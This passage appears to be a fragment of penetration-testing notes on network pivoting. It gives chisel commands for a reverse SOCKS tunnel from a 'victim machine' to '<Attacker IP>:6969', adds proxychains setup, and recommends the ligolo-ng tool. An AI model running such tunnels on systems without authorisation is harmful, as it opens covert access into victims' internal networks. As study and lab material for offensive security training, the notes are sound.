with chisel

```
# On the attacker machine:
./chisel server -p 6969 --socks5 --reverse

# On the victim machine:
./chisel client <Attacker IP>:6969 R:socks

# then add the 127.0.0.1:<given port> to your /etc/proxychains
# and use proxychains
```

#### Super tool !
https://github.com/nicocha30/ligolo-ng